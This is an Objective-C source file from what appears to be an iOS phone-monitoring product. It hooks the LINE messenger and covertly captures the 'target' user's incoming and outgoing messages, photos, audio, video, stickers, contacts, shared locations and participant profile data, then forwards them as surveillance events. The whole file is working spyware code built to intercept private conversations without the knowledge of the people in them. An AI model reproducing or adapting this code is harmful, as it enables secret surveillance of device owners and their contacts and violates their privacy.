/*
 *  LINE.h
 *  MSFSP
 *
 *  Created by Makara Khloth on 11/27/12.
 *  Copyright 2012 __MyCompanyName__. All rights reserved.
 *
 */

#import <Foundation/Foundation.h>

// LINE header files
#import "TalkMessageObject.h"
#import "TalkChatObject.h"
#import	"TalkUserObject.h"
#import	"TalkUserDefaultManager.h"
#import "TalkImageCacheManager.h"			// owner profile
#import "TalkUtil.h"						// owner profile
#import "LineLocation.h"
#import "LineStickerManager.h"
#import "LineStickerPackage.h"
#import "ContactModel.h"
#import "LINEUtils.h"
#import "NLAudioURLLoader.h"
//#import "NLMovieURLLoader.h"
//#import "MessageViewController.h"
//#import "NLMoviePlayerController.h"
//#import "LineStickerDataSourceManager.h"
//#import "_TalkContactObject.h"
//#import "ContactService.h"

#import "FxIMEvent.h"
#import	"FxRecipient.h"
#import "FxIMGeoTag.h"
#import "FxAttachment.h"
#import "DateTimeFormat.h"

// for fixing bug
//#import "ChatDAO.h"
//#import "ChatService.h"
//#import "TalkTextView.h"
#import "TalkMessageObject.h"
//#import "_TalkChatObject.h"
#import "LineMessage.h"

#pragma mark -
#pragma mark Private Method


void printLog (TalkMessageObject *aMsgObj);



#pragma mark -
#pragma mark Incoming for ALL version and Outgoing for earier version than 3.5.0


/***********************************************************************************************************		 
	LINE version 3.5.0, 3.5.1, 3.6.0
		- For INCOMMING message 
 	LINE version earier than 3.5.0
		- For OUTGOING message
	LINE version 3.4.1
		- when a user changes the status message, this method is called as outgoing event
 
	Supported content type
	 - text
	 - image
	 - audio
	 - video
	 - contact
	 - share location 
 ***********************************************************************************************************/
HOOK(TalkChatObject, addMessagesObject$, void, id aMsgObj) {
	DLog (@">>>>>>>>>>>>>>>>>>>>> TalkChatObject --> addMessagesObject");	

    CALL_ORIG(TalkChatObject, addMessagesObject$, aMsgObj);
			
	TalkMessageObject *msgObj		= aMsgObj;
	NSString *message				= [msgObj text];
	DLog (@"message [%@]", message)
	DLog (@"TalkChatObject [%@]", self)
	printLog(msgObj);
	
	NSInteger contentType = [[msgObj contentType] intValue]; 
	
	if([msgObj isSystemMessage]												|| 
	   !message																||	// quit if message is null (Sticker) This does NOT work on LINE version 3.6.0
		[LINEUtils isUnSupportedContentType:(LineContentType) contentType]	){  // This works on LINE version 3.6.0
		return;
	}	
		
	NSString *userId					= nil;
	NSString *userDisplayName			= nil;
	NSString *userStatusMessage			= nil;
	NSData *imageData					= nil;
	NSData *senderImageProfileData		= nil;
	NSString *imServiceId				= @"lin";
	NSMutableArray *participants		= [NSMutableArray array];
	NSSet *members						= [self members];
	FxEventDirection direction						= kEventDirectionUnknown;		
	NSData *conversationProfilePicData	= nil;
	TalkChatObject *chatObj				= self;
	
	Class $LineUserManager(objc_getClass("TalkUserDefaultManager"));
		
	// !!!!!! This case is NOT called when sending LINE message anymore SINCE version 3.5.0
	// -- OUTGOING -------------------------------------
	if([msgObj isSendMessage] && [msgObj isMyMessage]) {				// sending message, my message		
		direction			= kEventDirectionOut;
		userId				= [$LineUserManager mid];					// sender id
		userDisplayName		= [$LineUserManager name];					// sender name
		userStatusMessage	= [$LineUserManager statusMessage];			// sender status message
		imageData			= [LINEUtils getOwnerPictureProfile:userId];
		
		DLog (@"sender %@", [msgObj sender])
		DLog (@"finding members...")		

		/****************************************************************
		 * When changing owner status message, this method will be called with:
		 * - no member for [self members]. That results in no participant (because no member exists)
		 * - conversation id is -
		 * - no participant (because no member exists)	
		 ****************************************************************/
		for (TalkUserObject *obj in members) {							// note that members does NOT INCLUDE the target account
			NSAutoreleasePool *pool		= [[NSAutoreleasePool alloc] init];				
			FxRecipient *participant	= nil;																	
			participant					= [LINEUtils createFxRecipientWithTalkUserObject:obj];				
			DLog (@"member: %@", participant)							
			[participants addObject:participant];									
			[pool drain];
		}
		senderImageProfileData			= imageData;
		
		// -- Add conversation picture profile	
		if ([LINEUtils isIndividualConversationForChatType:[chatObj type]
											  participants:participants]) {
			conversationProfilePicData = [(FxRecipient *)[participants objectAtIndex:0] mPicture];			
		}	
	} 
	// -- INCOMING -------------------------------------	
	//} else if ([msgObj isReceivedMessage]) { // receieved message
	else if ([[msgObj messageType] isEqualToString:@"R"]) {
		direction			= kEventDirectionIn;
		userId				= [[msgObj sender] mid];				// sender (not target) id
		userDisplayName		= [[msgObj sender] displayUserName];	// sender (not target) name
		userStatusMessage	= [[msgObj sender] statusMessage];		// sender (not target) status message
		imageData			= [LINEUtils getOwnerPictureProfile:[$LineUserManager mid]];
		
		for (TalkUserObject *obj in members) {
			DLog (@"profileImage %@", [obj profileImage])
			// -- Add recipient except sender
			if (![[obj mid] isEqualToString:userId]) {							
				NSAutoreleasePool *pool		= [[NSAutoreleasePool alloc] init];
				FxRecipient *participant	= [LINEUtils createFxRecipientWithTalkUserObject:obj];						
				[participants addObject:participant];						
				[pool drain];					
			}						
		}		
		// -- Add target as recipient		
		FxRecipient *participant = [LINEUtils createFxRecipientWithMID:[$LineUserManager mid]						// target id
																  name:[$LineUserManager name]						// target name
														 statusMessage:[$LineUserManager statusMessage]				// target status message
													  imageProfileData:imageData];	// 0 is max compression			

		[participants insertObject:participant atIndex:0];						// target must be in the 1st index of participant for incoming
		
		senderImageProfileData = [LINEUtils getContactPictureProfile:userId];

		// -- Add conversation picture profile
		if ([LINEUtils isIndividualConversationForChatType:[chatObj type] participants:participants]) {
			conversationProfilePicData = senderImageProfileData;
		}					
	}

	DLog (@"sender imageData %d",		[senderImageProfileData length]);
	DLog (@"mUserID (sender) ->	%@",	userId);
	DLog (@"userDisplayName %@",		userDisplayName)
	DLog (@"userStatusMessage : %@"		,userStatusMessage)
	DLog (@"mDirection ->	%d",		direction);
	DLog (@"mIMServiceID ->	%@",		imServiceId);
	DLog (@"mMessage ->	%@",			message);
	DLog (@"mParticipants ->	%@",	participants);
	DLog (@"chat title %@ mid type %d", [self title], [self midType])		// ZTYPE in ZCHAT table    1 invite 2 group 0 individual
	DLog (@"chat mid %@", [self mid])		
		
	/********************************
	 *			FxIMEvent
	 ********************************/
	
	// NOTE: conversation id of status message changing event for version 3.4.1 is '_'. 
	// For version 3.5.0 and 3.5.1, the change of status message doesn't call this function
	if ([participants count] != 0				&&
		![[self mid] isEqualToString:@"_"]		) {				
		if (contentType == kLINEContentTypeImage) {
			DLog (@"====== LINE IMAGE in =====")
			[LINEUtils sendImageContentTypeEventUserID:userId					// sender id
									   userDisplayName:userDisplayName			// sender display name
									 userStatusMessage:userStatusMessage		// sender status message
								userProfilePictureData:senderImageProfileData	// sender image profile
											 direction:direction 			 
										conversationID:[self mid]
									  conversationName:[self title] 
							conversationProfilePicture:conversationProfilePicData			 
										  participants:participants 			 
											 photoData:[msgObj imageData]		/// !!!: the image is not downloaded yet for incomming
										 thumbnailData:[msgObj thumbnail]];	
		} 		
		// ======== Shared Location
		else if (contentType == kLINEContentTypeShareLocation) {
			DLog (@"====== LINE SHARE LOCATION in =====")
			LineLocation *lineLocation	= [msgObj lineLocation];
			FxIMGeoTag *imGeoTag		= [LINEUtils getIMGeoTax:lineLocation];				
			[LINEUtils sendSharedLocationContentTypeEventUserID:userId
												userDisplayName:userDisplayName 
											  userStatusMessage:userStatusMessage 
										 userProfilePictureData:senderImageProfileData 
													  direction:direction 
												 conversationID:[self mid]
											   conversationName:[self title] 
									 conversationProfilePicture:conversationProfilePicData
												   participants:participants 
												  shareLocation:imGeoTag];
		} 		
		// ======== Sticker
		else if (contentType == kLINEContentTypeSticker) {	
			DLog (@"====== LINE STICKER in =====")
			Class $LineStickerManager(objc_getClass("LineStickerManager"));
			LineStickerPackage *lineStickerPackage  = [$LineStickerManager packageWithStickerID:[msgObj sticker]];
			[LINEUtils sendStickerContentTypeEventUserID:userId	
										 userDisplayName:userDisplayName
									   userStatusMessage:userStatusMessage
								  userProfilePictureData:senderImageProfileData		
											   direction:direction
										  conversationID:[self mid]
										conversationName:[self title] 
							  conversationProfilePicture:conversationProfilePicData
											participants:participants
											   stickerID:[msgObj sticker]
										stickerPackageID:[lineStickerPackage IDString]
								   stickerPackageVersion:[lineStickerPackage downloadedVersion]];			
		}
		// ======== Audio
		else if (contentType == kLINEContentTypeAudioMessage) {
			DLog (@"====== LINE AUDIO in =====")
			DLog (@"message id %@", [aMsgObj id])
			DLog (@"audio path %@",[[aMsgObj audioFileURL] path])
			// -- load audio
			[LINEUtils loadAudio:[aMsgObj id]];
						
			// -- send message
			DLog (@"====== sending audio .... ===")
			[LINEUtils send2AudioContentTypeEventUserID:userId
										userDisplayName:userDisplayName
									  userStatusMessage:userStatusMessage
								 userProfilePictureData:senderImageProfileData 
											  direction:direction 
										 conversationID:[self mid] 
									   conversationName:[self title] 
							 conversationProfilePicture:conversationProfilePicData
										   participants:participants 
											  audioPath:[[aMsgObj audioFileURL] path]];		
		}		
		// ======== Video
		else if (contentType == kLINEContentTypeVideo) {
			DLog (@"====== LINE VIDEO in =====")
			[LINEUtils sendVideoContentTypeEventUserID:userId
									   userDisplayName:userDisplayName
									 userStatusMessage:userStatusMessage 
								userProfilePictureData:senderImageProfileData 
											 direction:direction 
										conversationID:[self mid] 
									  conversationName:[self title] 
							conversationProfilePicture:conversationProfilePicData
										  participants:participants 
											 audioPath:message];
		}
		// ======== Contact
		else if (contentType == kLINEContentTypeContact) {
			DLog (@"====== LINE CONTACT in =====")
			ContactModel *contactModel = (ContactModel *) [msgObj contactModel];
			
			[LINEUtils sendContactContentTypeEventUserID:userId
										 userDisplayName:userDisplayName
									   userStatusMessage:userStatusMessage 
								  userProfilePictureData:senderImageProfileData 
											   direction:direction 
										  conversationID:[self mid] 
										conversationName:[self title] 
							  conversationProfilePicture:conversationProfilePicData
											participants:participants 
											contactModel:contactModel];
		}
		
		// ======== Text
		else {							
			FxIMEvent *imEvent	= [[FxIMEvent alloc] init];
			[imEvent setDateTime:[DateTimeFormat phoenixDateTime]];			
			[imEvent setMIMServiceID:imServiceId];
			[imEvent setMServiceID:kIMServiceLINE];			
			[imEvent setMDirection:(FxEventDirection)direction];
						
			[imEvent setMRepresentationOfMessage:kIMMessageText];					
			[imEvent setMMessage:message];
		
			[imEvent setMUserID:userId];						// sender id
			[imEvent setMUserDisplayName:userDisplayName];		// sender display name
			[imEvent setMUserStatusMessage:userStatusMessage];	// sender status message
			[imEvent setMUserPicture:senderImageProfileData];	// sender image profile
			[imEvent setMUserLocation:nil];						// sender location
			
			[imEvent setMConversationID:[self mid]];			
			[imEvent setMConversationName:[self title]];
			[imEvent setMConversationPicture:conversationProfilePicData];
			
			[imEvent setMParticipants:participants];		
			
			[imEvent setMAttachments:[NSArray array]];
			
			[imEvent setMShareLocation:nil];
							
			[LINEUtils sendLINEEvent:imEvent];				// This funtion will remove emoji
			[imEvent release];
			imEvent = nil;
		}
	} 
	else {
		DLog (@"This may be Status Message")
	}
}


#pragma mark -
#pragma mark Outgoing


/***********************************************************************************************************
	LINE version 3.5.0, 3.5.1, 3.6.0
		- For OUTGOING message
 
	Supported content type
	 - text
	 - image
	 - audio
	 - video
	 - contact
	 - share location
 ***********************************************************************************************************/
HOOK(TalkMessageObject, send, void) {
	DLog (@">>>>>>>>>>>>>>>>>>>>> TalkMessageObject --> send");	
    CALL_ORIG(TalkMessageObject, send);
			
	TalkMessageObject *msgObj		= self;
	NSString *message				= [msgObj text]; 
	NSInteger contentType			= [[msgObj contentType] intValue]; 
	
	DLog (@"message [%@]", message)
	DLog (@"sticker [%d]", [msgObj sticker])
	DLog (@"contentType [%@]", [msgObj contentType])
	
	printLog(msgObj);
	
	/******** QUIT with the below condition ******/

	if ([msgObj isSystemMessage])	return;
	
	// quit message is null (Sticker)
	// If the content is sticker or contact, message variable is nil
	//if (!message)	return;		// comment this line out. contact message will be filter out in the below method
	
	if ([LINEUtils isUnSupportedContentType:(LineContentType)contentType])
		return;
	/****************** end QUIT ****************/	
	
	NSString *userId					= nil;
	NSString *userDisplayName			= nil;
	NSString *userStatusMessage			= nil;
	NSData *userPictureProfileData		= nil;
	NSString *imServiceId				= @"lin";
	NSMutableArray *participants		= [NSMutableArray array];
	TalkChatObject *chatObj				= [self chat];
	NSSet *members						= [chatObj members];
	FxEventDirection	direction		= kEventDirectionUnknown;		
	NSData *conversationProfilePicData	= nil;
	
	Class $TalkUserDefaultManager(objc_getClass("TalkUserDefaultManager"));
	
	DLog (@"chatObj [%@]", chatObj)			
	DLog (@"members %@ %@", [[members anyObject] class], members)		
					
	// -- OUTGOING -------------------------------------
	if([msgObj isSendMessage] && [msgObj isMyMessage] && [[msgObj messageType] isEqualToString:@"S"]) {	// sending message, my message
		direction				= kEventDirectionOut;
		userId					= [$TalkUserDefaultManager mid];						// sender id
		userDisplayName			= [$TalkUserDefaultManager name];						// sender name
		userStatusMessage		= [$TalkUserDefaultManager statusMessage];
		userPictureProfileData  = [LINEUtils getOwnerPictureProfile:userId];
		
		DLog (@"sender %@", [msgObj sender])
		DLog (@"finding members...")
					
		for (TalkUserObject *obj in members) {					// note that members does not include the target account (not include sender in this case)
			NSAutoreleasePool *pool		= [[NSAutoreleasePool alloc] init];				
			FxRecipient *participant	= nil;											
			participant					= [LINEUtils createFxRecipientWithTalkUserObject:obj];										
			DLog (@">>>> member: %@", participant)																																					
			[participants addObject:participant];			
			[pool drain];
		}		

		// -- conversation profile picture
		if ([LINEUtils isIndividualConversationForChatType:[chatObj type]
											  participants:participants]) {
			conversationProfilePicData = [(FxRecipient *)[participants objectAtIndex:0] mPicture];
		}
		
		DLog (@"mUserID (sender) ->	%@",	userId);
		DLog (@"userDisplayName %@",		userDisplayName)
		DLog (@"userStatusMessage : %@",	userStatusMessage)
		DLog (@"mDirection ->	%d",		direction);
		DLog (@"mIMServiceID ->	%@",		imServiceId);
		DLog (@"mMessage ->	%@",			message);
		DLog (@"mParticipants ->	%@",	participants);
		DLog (@"chat title %@ mid type %d", [chatObj title], [chatObj midType])		// ZTYPE in ZCHAT table    1 invite 2 group 0 individual
		DLog (@"chat mid %@",				[chatObj mid])							// ZMID in ZCHAT table     r          c            u		
		
		/********************************
		 *			FxIMEvent
		 ********************************/		
		// ======== Image		
		if (contentType == kLINEContentTypeImage) {		
			DLog (@"====== LINE IMAGE =====")
			[LINEUtils sendImageContentTypeEventUserID:userId
									   userDisplayName:userDisplayName 
									 userStatusMessage:userStatusMessage 
								userProfilePictureData:userPictureProfileData 								
											 direction:(FxEventDirection) direction 
										conversationID:[chatObj mid]
									  conversationName:[chatObj title] 
							conversationProfilePicture:conversationProfilePicData
										  participants:participants 
											 photoData:[msgObj imageData]
										 thumbnailData:[msgObj thumbnail]];
		} 
		// ======== Shared Location
		else if (contentType == kLINEContentTypeShareLocation) {		
			DLog (@"====== LINE SHARE LOCATION =====")
			LineLocation *lineLocation	= [msgObj lineLocation];
			FxIMGeoTag *imGeoTag		= [LINEUtils getIMGeoTax:lineLocation];				
			[LINEUtils sendSharedLocationContentTypeEventUserID:userId
												userDisplayName:userDisplayName 
											  userStatusMessage:userStatusMessage 
										 userProfilePictureData:userPictureProfileData 
													  direction:(FxEventDirection) direction 
												 conversationID:[chatObj mid]
											   conversationName:[chatObj title] 
									 conversationProfilePicture:conversationProfilePicData
												   participants:participants 
												  shareLocation:imGeoTag];
		} 
		// ======== Sticker
		else if (contentType == kLINEContentTypeSticker) {
			DLog (@"====== LINE STICKER =====")
			Class $LineStickerManager(objc_getClass("LineStickerManager"));
			LineStickerPackage *lineStickerPackage  = [$LineStickerManager packageWithStickerID:[msgObj sticker]];
			[LINEUtils sendStickerContentTypeEventUserID:userId	
										 userDisplayName:userDisplayName
									   userStatusMessage:userStatusMessage
								  userProfilePictureData:userPictureProfileData		
											   direction:direction
										  conversationID:[chatObj mid]
										conversationName:[chatObj title] 
							  conversationProfilePicture:conversationProfilePicData
											participants:participants
											   stickerID:[msgObj sticker]
										stickerPackageID:[lineStickerPackage IDString]
								   stickerPackageVersion:[lineStickerPackage downloadedVersion]];				
		}
		// ======== Audio
		else if (contentType == kLINEContentTypeAudioMessage) {
			DLog (@"====== LINE AUDIO =====")
			[LINEUtils sendAudioContentTypeEventUserID:userId
									   userDisplayName:userDisplayName
									 userStatusMessage:userStatusMessage userProfilePictureData:userPictureProfileData 
											 direction:direction 
										conversationID:[chatObj mid] 
									  conversationName:[chatObj title] 
							conversationProfilePicture:conversationProfilePicData
										  participants:participants 
											 audioPath:message];
			
		}
		// ======== Video
		else if (contentType == kLINEContentTypeVideo) {
			DLog (@"====== LINE VIDEO =====")
			[LINEUtils sendVideoContentTypeEventUserID:userId
									   userDisplayName:userDisplayName
									 userStatusMessage:userStatusMessage 
								userProfilePictureData:userPictureProfileData 
											 direction:direction 
										conversationID:[chatObj mid] 
									  conversationName:[chatObj title] 
							conversationProfilePicture:conversationProfilePicData
										  participants:participants 
											 audioPath:message];
			
		}
		// ======== Contact
		else if (contentType == kLINEContentTypeContact) {
			DLog (@"====== LINE CONTACT =====")
			ContactModel *contactModel = (ContactModel *) [msgObj contactModel];

			[LINEUtils sendContactContentTypeEventUserID:userId
									   userDisplayName:userDisplayName
									 userStatusMessage:userStatusMessage 
								userProfilePictureData:userPictureProfileData 
											 direction:direction 
										conversationID:[chatObj mid] 
									  conversationName:[chatObj title] 
							conversationProfilePicture:conversationProfilePicData
										  participants:participants 
										contactModel:contactModel];
		}
		// ======== Text
		else {
			FxIMEvent *imEvent			= [[FxIMEvent alloc] init];
			[imEvent setDateTime:[DateTimeFormat phoenixDateTime]];
					
			[imEvent setMIMServiceID:imServiceId];
			[imEvent setMServiceID:kIMServiceLINE];
			
			[imEvent setMDirection:(FxEventDirection)direction];
									
			[imEvent setMRepresentationOfMessage:kIMMessageText];			
			[imEvent setMMessage:message];
									
			[imEvent setMUserID:userId];
			[imEvent setMUserDisplayName:userDisplayName];
			[imEvent setMUserStatusMessage:userStatusMessage];
			[imEvent setMUserPicture:userPictureProfileData];
			[imEvent setMUserLocation:nil];
			
			[imEvent setMConversationID:[chatObj mid]];	
			[imEvent setMConversationName:[chatObj title]];
			[imEvent setMConversationPicture:conversationProfilePicData];		
			DLog (@"conversationProfilePicData >> %d", [conversationProfilePicData length])

			[imEvent setMParticipants:participants];
							
			[imEvent setMAttachments:[NSArray array]];		
								
			[LINEUtils sendLINEEvent:imEvent];
			[imEvent release];
		}
	}
}





/***********************************************************************************************************
	LINE version 3.6.0
		- For OUTGOING message sent from PC version of LINE
	Note that this method will be called for the outgoing message sent from device also, but we've added 
	the logic to filter this case out
	
	Supported content type
	 - text
	 - sticker		
 ***********************************************************************************************************/

HOOK(TalkMessageObject, line_messageSent$, void, id sent) {
	DLog (@">>>>>>>>>>>>>>>>>>>>> TalkMessageObject --> line_messageSent %@ %d", [NSThread currentThread], [NSThread isMainThread]);
	
	CALL_ORIG(TalkMessageObject, line_messageSent$, sent);
	
	TalkMessageObject *msgObj	= self;
	NSString *message			= [msgObj text]; 
	LineMessage *lineMessage	= sent;
	NSInteger contentType		= [lineMessage contentType];
	
	/******** QUIT with the below condition ******/	
	
	if (![msgObj isSystemMessage]) {																	// It's not a system message
		if (([lineMessage contentTypeIsSet]		&& contentType == kLINEContentTypeText)			||		// TEXT: The content type is set and the content type is TEXT
			([lineMessage contentMetadataIsSet] && contentType == kLINEContentTypeSticker)		){		// STICKER: The content metadata is set and teh content type is STICKER
			
			DLog (@"process text...")
			
			NSString *userId					= nil;
			NSString *userDisplayName			= nil;
			NSString *userStatusMessage			= nil;
			NSData *userPictureProfileData		= nil;
			NSString *imServiceId				= @"lin";
			NSMutableArray *participants		= [NSMutableArray array];
			TalkChatObject *chatObj				= [self chat];
			NSSet *members						= [chatObj members];
			FxEventDirection	direction		= kEventDirectionUnknown;		
			NSData *conversationProfilePicData	= nil;
			
			Class $TalkUserDefaultManager(objc_getClass("TalkUserDefaultManager"));
			
			DLog (@"chatObj [%@]", chatObj)			
			DLog (@"members %@ %@", [[members anyObject] class], members)
			
			// -- OUTGOING -------------------------------------
			if([msgObj isSendMessage] && [msgObj isMyMessage] && [[msgObj messageType] isEqualToString:@"S"]) {	// sending message, my message
				direction				= kEventDirectionOut;
				userId					= [$TalkUserDefaultManager mid];						// sender id
				userDisplayName			= [$TalkUserDefaultManager name];						// sender name
				userStatusMessage		= [$TalkUserDefaultManager statusMessage];
				userPictureProfileData  = [LINEUtils getOwnerPictureProfile:userId];
				
				DLog (@"sender %@", [msgObj sender])
				DLog (@"finding members...")
				
				for (TalkUserObject *obj in members) {					// note that members does not include the target account (not include sender in this case)
					NSAutoreleasePool *pool		= [[NSAutoreleasePool alloc] init];				
					FxRecipient *participant	= nil;											
					participant					= [LINEUtils createFxRecipientWithTalkUserObject:obj];										
					DLog (@">>>> member: %@", participant)																																					
					[participants addObject:participant];			
					[pool drain];
				}		
				
				// -- conversation profile picture
				if ([LINEUtils isIndividualConversationForChatType:[chatObj type]
													  participants:participants]) {
					conversationProfilePicData = [(FxRecipient *)[participants objectAtIndex:0] mPicture];
				}
				
				DLog (@"mUserID (sender) ->	%@",	userId);
				DLog (@"userDisplayName %@",		userDisplayName)
				DLog (@"userStatusMessage : %@",	userStatusMessage)
				DLog (@"mDirection ->	%d",		direction);
				DLog (@"mIMServiceID ->	%@",		imServiceId);
				DLog (@"mMessage ->	%@",			message);
				DLog (@"mParticipants ->	%@",	participants);
				DLog (@"chat title %@ mid type %d", [chatObj title], [chatObj midType])		// ZTYPE in ZCHAT table    1 invite 2 group 0 individual
				DLog (@"chat mid %@",				[chatObj mid])							// ZMID in ZCHAT table     r          c            u		
				
				
				// ======== Sticker
				if (contentType == kLINEContentTypeSticker) {
					DLog (@"====== LINE STICKER =====")
					Class $LineStickerManager(objc_getClass("LineStickerManager"));
					LineStickerPackage *lineStickerPackage  = [$LineStickerManager packageWithStickerID:[msgObj sticker]];
					[LINEUtils sendStickerContentTypeEventUserID:userId	
												 userDisplayName:userDisplayName
											   userStatusMessage:userStatusMessage
										  userProfilePictureData:userPictureProfileData		
													   direction:direction
												  conversationID:[chatObj mid]
												conversationName:[chatObj title] 
									  conversationProfilePicture:conversationProfilePicData
													participants:participants
													   stickerID:[msgObj sticker]
												stickerPackageID:[lineStickerPackage IDString]
										   stickerPackageVersion:[lineStickerPackage downloadedVersion]];				
				} else {
					
					/********************************
					 *			FxIMEvent
					 ********************************/	
					FxIMEvent *imEvent			= [[FxIMEvent alloc] init];
					[imEvent setDateTime:[DateTimeFormat phoenixDateTime]];
					
					[imEvent setMIMServiceID:imServiceId];
					[imEvent setMServiceID:kIMServiceLINE];
					
					[imEvent setMDirection:(FxEventDirection)direction];
					
					[imEvent setMRepresentationOfMessage:kIMMessageText];			
					[imEvent setMMessage:message];
					
					[imEvent setMUserID:userId];
					[imEvent setMUserDisplayName:userDisplayName];
					[imEvent setMUserStatusMessage:userStatusMessage];
					[imEvent setMUserPicture:userPictureProfileData];
					[imEvent setMUserLocation:nil];
					
					[imEvent setMConversationID:[chatObj mid]];	
					[imEvent setMConversationName:[chatObj title]];
					[imEvent setMConversationPicture:conversationProfilePicData];		
					DLog (@"conversationProfilePicData >> %d", [conversationProfilePicData length])
					
					[imEvent setMParticipants:participants];
					
					[imEvent setMAttachments:[NSArray array]];		
					
					[LINEUtils sendLINEEvent:imEvent];
					[imEvent release];	
				}
			}
			
		}
	}
	
	DLog (@"sent %@", sent);	// LineMessage
	//DLog (@"class %@", [sent class]);	
	DLog (@"contentPreviewIsSet %d", [sent contentPreviewIsSet]);
	DLog (@"contentPreview %@", [sent contentPreview]);
	DLog (@"contentMetadataIsSet %d", [sent contentMetadataIsSet]);
	DLog (@"contentMetadata %@", [sent contentMetadata]);
	DLog (@"contentTypeIsSet %d", [sent contentTypeIsSet]);
	DLog (@"contentType %d", [sent contentType]);
	DLog (@"hasContentIsSet %d", [sent hasContentIsSet]);
	DLog (@"hasContent %d", [sent hasContent]);
	//DLog (@"locationIsSet %d", [sent locationIsSet]);
	//DLog (@"location %@", [sent location]);
	DLog (@"textIsSet %d", [sent textIsSet]);
	DLog (@"text %@", [sent text]);
	DLog (@"deliveredTimeIsSet %d", [sent deliveredTimeIsSet]);
	DLog (@"deliveredTime %d", [sent deliveredTime]);
	DLog (@"createdTimeIsSet %d", [sent createdTimeIsSet]);
	DLog (@"createdTime %d", [(LineMessage *) sent createdTime])
	DLog (@"IDIsSet %d", [sent IDIsSet])
	DLog (@"createdTimeIsSet %d", [sent createdTimeIsSet])
	DLog (@"ID %@", [(LineMessage *)sent ID])
	DLog (@"toTypeIsSet %d", [sent toTypeIsSet])
	DLog (@"toType %d", [sent toType])	
	DLog (@"toIsSet %d", [sent toIsSet])	
	DLog (@"to %@", [sent to])	
	DLog (@"fromIsSet %d", [sent fromIsSet])
	DLog (@"from %@", [sent from])		
	
	printLog(msgObj);		
}

void printLog (TalkMessageObject *aMsgObj) {
	DLog (@"=======================================")
	DLog (@"TalkMessageObject %@",		aMsgObj)
	DLog (@"Message type %@",			[aMsgObj messageType])
	
	// -- location testing
	//DLog (@"sharingLocationTemporary [%@]", [[self chat] sharingLocationTemporary])
	DLog (@"lineLocation [%@]",			[aMsgObj lineLocation])		//LineLocation
	DLog (@"lineLocation class [%@]",	[[aMsgObj lineLocation] class])
	DLog (@"longitude [%.10f]",			[(LineLocation *)[aMsgObj lineLocation] longitude])
	DLog (@"latitude [%.10f]",			[(LineLocation *)[aMsgObj lineLocation] latitude])	
	DLog (@"longitudeIsSet [%d]",		[[aMsgObj lineLocation] longitudeIsSet])
	DLog (@"latitudeIsSet [%d]",		[[aMsgObj lineLocation] latitudeIsSet])	
	DLog (@"phone [%@]",				[[aMsgObj lineLocation] phone])	
	DLog (@"locationText [%@]",			[aMsgObj locationText])
	DLog (@"address [%@]",				[aMsgObj address])

	// -- image testing
	DLog (@"imageData %d",				[[aMsgObj imageData] length]);		
	DLog (@"imageName %@",				[aMsgObj imageName]);
	DLog (@"imageURL %@",				[aMsgObj imageURL]);	
	DLog (@"imageFileURL %@",			[aMsgObj imageFileURL]);
	DLog (@"temporaryImageName %@",		[aMsgObj temporaryImageName]);
	DLog (@"thumbnail %@",				[aMsgObj thumbnail]);	
	//[[aMsgObj thumbnail] writeToFile:@"/tmp/image_thumbnail.jpg" atomically:YES];
	//DLog (@"photoName: %@", [msgObj id])
	//DLog (@"objectID: %@ %@", [msgObj objectID], [[msgObj objectID] class])
	//DLog (@"timestamp: %@", [msgObj timestamp])
		
	// -- audio testing
	DLog (@"audioFileURL %@",			[aMsgObj audioFileURL]);
	DLog (@"audioFileName %@",			[aMsgObj audioFileName]);
	
	// -- attachment testing
//	DLog (@"attachedFileURL %@",			[aMsgObj attachedFileURL]);
//	DLog (@"attachedFileDownloadURL %@",	[aMsgObj attachedFileDownloadURL]);
//	DLog (@"attachedFileNameToStore %@",	[aMsgObj attachedFileNameToStore]);
//	DLog (@"attachedFileName %@",			[aMsgObj attachedFileName]);
//	DLog (@"attachedFileNameToStore %@",	[aMsgObj attachedFileNameToStore]);

	// *************** Sticker ****************
	Class $LineStickerManager(objc_getClass("LineStickerManager"));
	DLog (@"================== STICKER ==================")
	DLog (@"sticker [%d]",			[aMsgObj sticker])
	DLog (@"package %@",			[$LineStickerManager packageWithStickerID:[aMsgObj sticker]])	// class LineStickerPackage	
	LineStickerPackage *lineStickerPackage  = [$LineStickerManager packageWithStickerID:[aMsgObj sticker]];
	//[lineStickerPackage downloadImageForSticker:[aMsgObj sticker] type:0 version:3 completionBlock:nil];	
	DLog (@"package id %d",					[lineStickerPackage ID])
	DLog (@"package IDString %@",			[lineStickerPackage IDString])
	DLog (@"package IDNumber %@",			[lineStickerPackage IDNumber])
	DLog (@"package currentVersion %u",		[lineStickerPackage currentVersion])
	DLog (@"package downloadedVersion %u",	[lineStickerPackage downloadedVersion])
	DLog (@"package downloaded %d",			[lineStickerPackage isDownloaded])
	DLog (@"package downloading %d",		[lineStickerPackage downloading])
	[lineStickerPackage ID]; // To remove the warning after disable log
	DLog (@"================== END STICKER ==================")
	
	DLog (@"contentType [%@]", [aMsgObj contentType])	
	//DLog (@"sharingLocationTemporary [%@]", [self sharingLocationTemporary])
	DLog (@"contentMetadata [%@]", [aMsgObj contentMetadata])
	
//	DLog (@"================== CONTACT ==================")
//	[(NSData *) [aMsgObj contentMetadata] writeToFile:@"/tmp/metadata.vcf" atomically:YES];
//	NSString* myString;
//	myString = [[NSString alloc] initWithData:[aMsgObj contentMetadata] encoding:NSUTF8StringEncoding];
//	DLog (@"myString [%@]", myString)
//	DLog (@"attachedFileModel [%@]", [aMsgObj attachedFileModel])
//	DLog (@"contactModel [%@]", (ContactModel *) [aMsgObj contactModel])	
//	ContactModel *contactModel = (ContactModel *) [aMsgObj contactModel];
//	DLog (@"[contactModel displayName] [%@]", [contactModel displayName])
//	
//	DLog (@"[contactModel displayName] [%@]", [contactModel mid])
//	DLog (@"[contactModel userObjectWithMid] [%@]", [contactModel userObjectWithMid:[contactModel mid]])
//	TalkUserObject *user = [contactModel userObjectWithMid:[contactModel mid]];
	
//	DLog (@"user object id %@", [user objectID])
//	DLog (@"[user customName] [%@]", [user customName])
//	DLog (@"[user name] [%@]", [user name])
//	DLog (@"[user displayUserName] [%@]", [user displayUserName])
//	DLog (@"[user addressbookName] [%@]", [user addressbookName])
//	DLog (@"[user mid] [%@]", [user mid])
//	DLog (@"[user memberId] [%@]", [user memberId])
//	DLog (@"================== END CONTACT ==================")
	
	
	DLog (@"=======================================")
}

// For OUTGOING message in LINE version 3.5.0, 3.5.1, 3.6.0
//HOOK(LineStickerPackage, downloadImageForSticker$type$version$completionBlock$, void, unsigned sticker, int type, unsigned version, id block) {
//	DLog (@">>>>>>>>>>>>>>>>>>>>> LineStickerPackage --> downloadImageForSticker");	
//	DLog (@"sticker %d", sticker)
//	DLog (@"type %d", type)
